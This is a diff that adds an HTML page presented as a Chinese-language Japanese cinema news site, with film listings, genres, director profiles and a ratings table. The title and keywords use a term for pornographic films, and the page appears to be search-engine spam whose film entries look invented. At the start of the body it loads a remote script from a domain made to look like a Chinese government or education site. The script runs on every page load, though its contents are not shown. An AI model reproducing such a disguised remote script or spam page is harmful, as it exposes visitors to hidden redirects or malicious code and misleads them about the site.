@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>日本黄色电影网 - 聚焦日本电影与影视资讯</title>
+<meta name="description" content="日本黄色电影网(ribenhuangsedianyingwang-wap.github.io)聚焦日本电影，涵盖经典佳作、新片速递、导演专题与口碑榜单，带你读懂日本影视。">
+<meta name="keywords" content="日本黄色电影网,日本电影,日影,日本影视资讯,日本导演,ribenhuangsedianyingwang-wap">
+<meta name="author" content="日本黄色电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://ribenhuangsedianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "日本黄色电影网",
+  "url": "https://ribenhuangsedianyingwang-wap.github.io/",
+  "description": "聚焦日本电影，涵盖经典佳作、新片速递、导演专题与口碑榜单"
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans CJK SC","Hiragino Sans GB","PingFang SC","Microsoft YaHei",sans-serif;
+  background:#fdfcfa;color:#1f2321;line-height:1.8;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+
+.wrap{max-width:1120px;margin:0 auto;padding:0 18px}
+
+/* ===== 顶部 ===== */
+.header{position:sticky;top:0;z-index:100;background:rgba(253,252,250,.94);backdrop-filter:blur(12px);border-bottom:1px solid rgba(0,0,0,.07)}
+.header .wrap{display:flex;align-items:center;justify-content:space-between;height:66px}
+.logo{font-size:20px;font-weight:900;color:#1a1a1a;display:flex;align-items:center;gap:11px;letter-spacing:.5px}
+.logo .en{font-family:"Times New Roman",serif;font-style:italic;font-weight:400;color:#b0002a;font-size:14px;letter-spacing:1px}
+.logo small{display:block;font-size:9px;color:#8a8a8a;letter-spacing:3px;font-weight:600;text-transform:uppercase;line-height:1.2}
+.logo .dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#b0002a;margin-right:2px}
+.nav{display:flex;gap:2px}
+.nav a{padding:9px 16px;border-radius:6px;font-size:15px;color:#333;font-weight:600;transition:.25s;position:relative}
+.nav a:hover,.nav a.on{color:#b0002a;background:rgba(176,0,42,.07);font-weight:700}
+.nav a.on::after{content:"";position:absolute;left:50%;bottom:-1px;transform:translateX(-50%);width:20px;height:2px;background:#b0002a;border-radius:2px}
+.nav-toggle{display:none;width:42px;height:42px;flex-direction:column;justify-content:center;align-items:center;gap:5px}
+.nav-toggle i{display:block;width:22px;height:2px;background:#1a1a1a;border-radius:2px}
+
+section{padding:80px 0;position:relative}
+.sec-head{margin-bottom:50px;display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap}
+.sec-head .left{border-left:4px solid #b0002a;padding-left:16px}
+.sec-head .left h2{font-size:clamp(24px,4vw,34px);color:#1a1a1a;font-weight:900;letter-spacing:-.5px}
+.sec-head .left p{color:#777;margin-top:8px;font-size:15px}
+.sec-head .more{padding:8px 18px;border:1px solid #ddd;border-radius:30px;font-size:13px;color:#555;transition:.25s;white-space:nowrap}
+.sec-head .more:hover{border-color:#b0002a;color:#b0002a}
+
+/* ===== Hero ===== */
+.hero{min-height:92vh;display:flex;align-items:center;position:relative;overflow:hidden;background:#f7f5f2}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center}
+.hero .stamp{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:4px;background:#b0002a;color:#fff;font-size:12px;font-weight:700;letter-spacing:1px;margin-bottom:26px}
+.hero h1{font-size:clamp(36px,6.5vw,60px);font-weight:900;color:#1a1a1a;line-height:1.15;letter-spacing:-1.5px}
+.hero h1 em{font-style:normal;color:#b0002a}
+.hero .sub{color:#555;margin:24px 0 36px;font-size:clamp(15px,2vw,18px);max-width:520px}
+.hero .btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 34px;border-radius:6px;font-weight:700;font-size:16px;transition:.3s;display:inline-flex;align-items:center;justify-content:center;gap:8px}
+.btn-p{background:#b0002a;color:#fff;box-shadow:0 10px 26px rgba(176,0,42,.3)}
+.btn-p:hover{transform:translateY(-2px);box-shadow:0 14px 32px rgba(176,0,42,.42)}
+.btn-o{border:1.5px solid #1a1a1a;color:#1a1a1a}
+.btn-o:hover{background:#1a1a1a;color:#fff}
+.hero .feat{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.hero .feat .f{border:1px solid #e5e5e5;background:#fff;padding:22px;border-radius:8px;transition:.3s}
+.hero .feat .f:hover{border-color:#b0002a;transform:translateY(-4px)}
+.hero .feat .f b{display:block;font-size:26px;font-weight:900;color:#b0002a;font-family:"Times New Roman",serif}
+.hero .feat .f span{display:block;font-size:14px;color:#444;margin-top:4px}
+
+/* ===== 栏目一：新片速递（杂志式纵向条列）===== */
+.magazine{background:#fff}
+.mlist{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border-top:2px solid #1a1a1a}
+.mlist article{display:grid;grid-template-columns:64px 1fr;gap:18px;padding:26px 24px;border-bottom:1px solid #ececec;transition:.3s;align-items:start}
+.mlist article:hover{background:#faf7f7}
+.mlist article .n{font-family:"Times New Roman",serif;font-size:30px;font-weight:900;color:#e5c7cd;line-height:1}
+.mlist article h4{font-size:18px;color:#1a1a1a;font-weight:800;margin-bottom:6px}
+.mlist article p{font-size:13.5px;color:#666;line-height:1.7}
+.mlist article .tg{margin-top:10px;display:flex;gap:8px;flex-wrap:wrap}
+.mlist article .tg span{font-size:11px;color:#b0002a;border:1px solid rgba(176,0,42,.25);padding:2px 9px;border-radius:3px}
+
+/* ===== 栏目二：影片分类（和风七宫格）===== */
+.cats{background:#f7f5f2}
+.kuku{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid #e2ded8}
+.kuku a{position:relative;aspect-ratio:1/1;border-right:1px solid #e2ded8;border-bottom:1px solid #e2ded8;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:16px;background:#fff;transition:.35s;overflow:hidden}
+.kuku a:nth-child(4n){border-right:none}
+.kuku a:nth-child(n+5){border-bottom:none}
+.kuku a::before{content:"";position:absolute;top:0;left:0;width:100%;height:3px;background:#b0002a;transform:scaleX(0);transform-origin:left;transition:.4s}
+.kuku a:hover::before{transform:scaleX(1)}
+.kuku a:hover{background:#fff8f9}
+.kuku a .ja{font-family:"Times New Roman",serif;font-style:italic;font-size:12px;color:#b0002a;opacity:.7;margin-bottom:6px}
+.kuku a b{font-size:16px;color:#1a1a1a;font-weight:800}
+.kuku a em{font-style:normal;font-size:12px;color:#999;margin-top:4px}
+
+/* ===== 栏目三：导演专题（左右交错）===== */
+.directors{background:#fff}
+.dirlist{display:flex;flex-direction:column;gap:0}
+.dirrow{display:grid;grid-template-columns:200px 1fr;gap:0;border-bottom:1px solid #ececec;transition:.3s}
+.dirrow:hover{background:#faf7f7}
+.dirrow .yr{background:#1a1a1a;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px 10px;text-align:center}
+.dirrow .yr b{font-family:"Times New Roman",serif;font-size:34px;font-weight:900;color:#fff}
+.dirrow .yr small{font-size:11px;color:#d99aa5;letter-spacing:2px}
+.dirrow .info{padding:26px 28px;display:flex;flex-direction:column;justify-content:center}
+.dirrow .info h4{font-size:19px;color:#1a1a1a;font-weight:800;margin-bottom:8px}
+.dirrow .info p{font-size:14px;color:#666;line-height:1.8}
+.dirrow .info .wk{margin-top:12px;display:flex;gap:10px;flex-wrap:wrap}
+.dirrow .info .wk span{font-size:12px;color:#444;background:#f2f2f2;padding:4px 12px;border-radius:3px}
+
+/* ===== 栏目四：口碑榜单（表格式）===== */
+.btable{background:#f7f5f2}
+.tbl{width:100%;border-collapse:collapse;background:#fff;border:1px solid #e2ded8}
+.tbl th{background:#1a1a1a;color:#fff;padding:16px 18px;text-align:left;font-size:13px;letter-spacing:1px}
+.tbl td{padding:16px 18px;border-bottom:1px solid #ececec;font-size:14px;color:#333;vertical-align:middle}
+.tbl tr{transition:.25s}
+.tbl tbody tr:hover{background:#fff8f9}
+.tbl .rk{font-family:"Times New Roman",serif;font-size:22px;font-weight:900;color:#b0002a;width:56px}
+.tbl .nm{font-weight:800;color:#1a1a1a;font-size:16px}
+.tbl .nm small{display:block;font-size:12px;color:#999;font-weight:400;margin-top:2px}
+.tbl .rate{font-weight:800;color:#b0002a;font-family:"Times New Roman",serif;font-size:17px}
+.tbl .star{color:#e0a94a;letter-spacing:2px}
+
+/* ===== 页脚 ===== */
+.footer{background:#1a1a1a;padding:56px 0 26px;color:#bbb}
+.footer .cols{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;margin-bottom:34px}
+.footer .brand p{color:#999;font-size:14px;margin-top:14px;line-height:1.8;max-width:340px}
+.footer h5{color:#fff;font-size:16px;margin-bottom:14px}
+.footer ul li{margin-bottom:9px}
+.footer ul a{color:#999;font-size:14px;transition:.2s}
+.footer ul a:hover{color:#e8a0ae}
+.footer .copy{text-align:center;color:#666;font-size:13px;border-top:1px solid rgba(255,255,255,.08);padding-top:24px}
+
+.topbtn{position:fixed;right:18px;bottom:18px;z-index:99;width:46px;height:46px;border-radius:8px;background:#b0002a;color:#fff;display:none;align-items:center;justify-content:center;font-size:20px;font-weight:900;box-shadow:0 8px 24px rgba(176,0,42,.4);transition:.3s}
+.topbtn.show{display:flex}
+.topbtn:hover{transform:translateY(-3px)}
+
+@media(max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:40px}
+  .kuku{grid-template-columns:repeat(3,1fr)}
+  .kuku a:nth-child(4n){border-right:1px solid #e2ded8}
+  .kuku a:nth-child(3n){border-right:none}
+  .kuku a:nth-child(n+5){border-bottom:1px solid #e2ded8}
+  .kuku a:nth-child(n+7){border-bottom:none}
+}
+@media(max-width:640px){
+  section{padding:56px 0}
+  .nav-toggle{display:flex}
+  .nav{position:fixed;top:66px;left:0;right:0;flex-direction:column;gap:2px;background:#fff;max-height:0;overflow:hidden;transition:.4s;padding:0 12px;border-bottom:1px solid rgba(0,0,0,.06)}
+  .nav.open{max-height:440px;padding:12px}
+  .nav a{width:100%;padding:14px 16px;font-size:16px;border-radius:6px}
+  .nav a.on::after{display:none}
+  .mlist{grid-template-columns:1fr}
+  .kuku{grid-template-columns:repeat(2,1fr)}
+  .kuku a:nth-child(3n){border-right:1px solid #e2ded8}
+  .kuku a:nth-child(2n){border-right:none}
+  .kuku a:nth-child(n+7){border-bottom:1px solid #e2ded8}
+  .kuku a:nth-child(n+9){border-bottom:none}
+  .dirrow{grid-template-columns:1fr}
+  .dirrow .yr{flex-direction:row;gap:10px;padding:14px}
+  .dirrow .yr b{font-size:22px}
+  .tbl .col-hide{display:none}
+  .footer .cols{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media(max-width:420px){
+  .hero .feat{grid-template-columns:1fr}
+  .footer .cols{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="header">
+  <div class="wrap">
+    <a href="https://ribenhuangsedianyingwang-wap.github.io/" class="logo"><span class="dot"></span>日本黄色电影网<small>Nihon Cinema</small><span class="en">jp</span></a>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单"><i></i><i></i><i></i></button>
+    <nav class="nav" id="nav">
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#magazine" class="on">新片速递</a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats">影片分类</a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#directors">导演专题</a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#btable">口碑榜单</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="wrap">
+    <div>
+      <span class="stamp">◆ 聚焦日本电影</span>
+      <h1>读懂<em>日本电影</em><br>从每一帧开始</h1>
+      <p class="sub">日本黄色电影网(ribenhuangsedianyingwang-wap.github.io)专注日本电影资讯，从经典佳作到新片速递，带你走进日影的世界。</p>
+      <div class="btns">
+        <a class="btn btn-p" href="https://ribenhuangsedianyingwang-wap.github.io/#magazine">浏览新片 →</a>
+        <a class="btn btn-o" href="https://ribenhuangsedianyingwang-wap.github.io/#btable">查看榜单</a>
+      </div>
+    </div>
+    <div class="feat">
+      <div class="f"><b>1200+</b><span>收录日本影片</span></div>
+      <div class="f"><b>50+</b><span>知名导演专题</span></div>
+      <div class="f"><b>每日</b><span>新片与资讯更新</span></div>
+      <div class="f"><b>10类</b><span>影片类型覆盖</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：新片速递（杂志式条列） -->
+<section id="magazine">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="left"><h2>新片速递</h2><p>近期上映的日本电影，一屏纵览</p></div>
+      <a class="more" href="https://ribenhuangsedianyingwang-wap.github.io/#magazine">查看全部 →</a>
+    </div>
+    <div class="mlist">
+      <article><span class="n">01</span><div><h4>东京黄昏</h4><p>一个关于都市孤独与重逢的温情故事，细腻捕捉东京街头的日常光影。</p><div class="tg"><span>剧情</span><span>温情</span><span>新片</span></div></div></article>
+      <article><span class="n">02</span><div><h4>海边的她</h4><p>夏日海岸线上的青春物语，清新治愈，充满生活气息的细腻佳作。</p><div class="tg"><span>青春</span><span>治愈</span><span>新片</span></div></div></article>
+      <article><span class="n">03</span><div><h4>沉默的真相</h4><p>层层设局的悬疑力作，反转不断，令人看完久久回味。</p><div class="tg"><span>悬疑</span><span>犯罪</span></div></div></article>
+      <article><span class="n">04</span><div><h4>京都往事</h4><p>以京都四季为背景的年代故事，古朴温婉，韵味悠长。</p><div class="tg"><span>年代</span><span>文艺</span></div></div></article>
+      <article><span class="n">05</span><div><h4>破风少年</h4><p>热血运动题材，讲述少年追逐梦想的真实历程。</p><div class="tg"><span>运动</span><span>励志</span></div></div></article>
+      <article><span class="n">06</span><div><h4>深夜食堂·番外</h4><p>熟悉的深夜食堂，几段温暖人心的市井故事。</p><div class="tg"><span>温情</span><span>群像</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：影片分类（和风宫格） -->
+<section id="cats" class="cats">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="left"><h2>影片分类</h2><p>十大类型，覆盖每一种观影心情</p></div>
+      <a class="more" href="https://ribenhuangsedianyingwang-wap.github.io/#cats">全部类型 →</a>
+    </div>
+    <div class="kuku">
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">dorama</span><b>剧情</b><em>286部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">ren'ai</span><b>爱情</b><em>254部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">samurai</span><b>时代</b><em>168部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">kaiki</span><b>恐怖</b><em>132部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">sasupensu</span><b>悬疑</b><em>176部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">komedi</span><b>喜剧</b><em>198部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">anime</span><b>动画</b><em>224部</em></a>
+      <a href="https://ribenhuangsedianyingwang-wap.github.io/#cats"><span class="ja">bunka</span><b>文艺</b><em>142部</em></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：导演专题（左右交错） -->
+<section id="directors">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="left"><h2>导演专题</h2><p>认识日本电影背后的造梦者</p></div>
+      <a class="more" href="https://ribenhuangsedianyingwang-wap.github.io/#directors">更多导演 →</a>
+    </div>
+    <div class="dirlist">
+      <div class="dirrow"><div class="yr"><b>是枝</b><small>HIROKAZU</small></div><div class="info"><h4>是枝裕和 —— 家庭与日常的诗人</h4><p>擅长以细腻温柔的镜头记录家庭关系与日常琐事，作品充满对生活的体察与人文关怀。</p><div class="wk"><span>《小偷家族》</span><span>《如父如子》</span><span>《海街日记》</span></div></div></div>
+      <div class="dirrow"><div class="yr"><b>北野</b><small>Takeshi</small></div><div class="info"><h4>北野武 —— 暴力美学的冷面笑匠</h4><p>极简镜头与突发暴力的独特风格，在冷峻与温情之间构建出极具辨识度的电影语言。</p><div class="wk"><span>《菊次郎的夏天》</span><span>《花火》</span><span>《座头市》</span></div></div></div>
+      <div class="dirrow"><div class="yr"><b>黑泽</b><small>Akira</small></div><div class="info"><h4>黑泽明 —— 日本电影的巨匠</h4><p>将日本武士精神与西方戏剧结构完美融合，对世界电影影响深远的里程碑式导演。</p><div class="wk"><span>《七武士》</span><span>《罗生门》</span><span>《乱》</span></div></div></div>
+      <div class="dirrow"><div class="yr"><b>新海</b><small>Makoto</small></div><div class="info"><h4>新海诚 —— 光影与情感的造梦师</h4><p>以极致精美的画面与细腻情感著称，打造出一个个令人心驰神往的动画世界。</p><div class="wk"><span>《你的名字。》</span><span>《天气之子》</span><span>《铃芽之旅》</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：口碑榜单（表格式） -->
+<section id="btable" class="btable">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="left"><h2>口碑榜单</h2><p>观众评分与热度双重筛选</p></div>
+      <a class="more" href="https://ribenhuangsedianyingwang-wap.github.io/#btable">完整榜单 →</a>
+    </div>
+    <table class="tbl">
+      <thead><tr><th>排名</th><th>影片名称</th><th class="col-hide">类型</th><th>评分</th><th class="col-hide">热度</th></tr></thead>
+      <tbody>
+        <tr><td class="rk">1</td><td class="nm">东京黄昏<small>2026 · 剧情</small></td><td class="col-hide">剧情</td><td class="rate">9.2</td><td class="col-hide star">★★★★★</td></tr>
+        <tr><td class="rk">2</td><td class="nm">海边的她<small>2026 · 青春</small></td><td class="col-hide">青春</td><td class="rate">9.0</td><td class="col-hide star">★★★★★</td></tr>
+        <tr><td class="rk">3</td><td class="nm">沉默的真相<small>2025 · 悬疑</small></td><td class="col-hide">悬疑</td><td class="rate">8.9</td><td class="col-hide star">★★★★☆</td></tr>
+        <tr><td class="rk">4</td><td class="nm">京都往事<small>2025 · 年代</small></td><td class="col-hide">年代</td><td class="rate">8.7</td><td class="col-hide star">★★★★☆</td></tr>
+        <tr><td class="rk">5</td><td class="nm">破风少年<small>2026 · 运动</small></td><td class="col-hide">运动</td><td class="rate">8.6</td><td class="col-hide star">★★★★☆</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="cols">
+      <div class="brand">
+        <div class="logo" style="color:#fff"><span class="dot"></span>日本黄色电影网<small style="color:#bbb">Nihon Cinema</small></div>
+        <p>日本黄色电影网(ribenhuangsedianyingwang-wap.github.io)聚焦日本电影，涵盖经典佳作、新片速递、导演专题与口碑榜单。</p>
+      </div>
+      <div><h5>网站导航</h5><ul>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#magazine">新片速递</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#cats">影片分类</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#directors">导演专题</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#btable">口碑榜单</a></li>
+      </ul></div>
+      <div><h5>热门类型</h5><ul>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#cats">经典剧情</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#cats">治愈爱情</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#cats">烧脑悬疑</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#cats">动画佳作</a></li>
+      </ul></div>
+      <div><h5>关于本站</h5><ul>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#">关于我们</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#">联系方式</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#">免责声明</a></li>
+        <li><a href="https://ribenhuangsedianyingwang-wap.github.io/#">意见反馈</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">© 2026 日本黄色电影网(ribenhuangsedianyingwang-wap.github.io) 保留所有权利 · 本站仅供影视资讯交流学习</div>
+  </div>
+</footer>
+
+<button class="topbtn" id="topBtn" aria-label="返回顶部">↑</button>
+
+<script>
+var navToggle=document.getElementById('navToggle');
+var nav=document.getElementById('nav');
+navToggle.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){
+  if(window.scrollY>400){topBtn.classList.add('show');}else{topBtn.classList.remove('show');}
+});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+var secs=document.querySelectorAll('section[id]');
+var links=document.querySelectorAll('.nav a');
+if('IntersectionObserver' in window){
+  var io=new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){
+        links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href').indexOf('#'+e.target.id)>-0);});
+      }
+    });
+  },{rootMargin:'-40% 0px -55% 0px'});
+  secs.forEach(function(s){io.observe(s);});
+}
+</script>
+</body>
+</html>
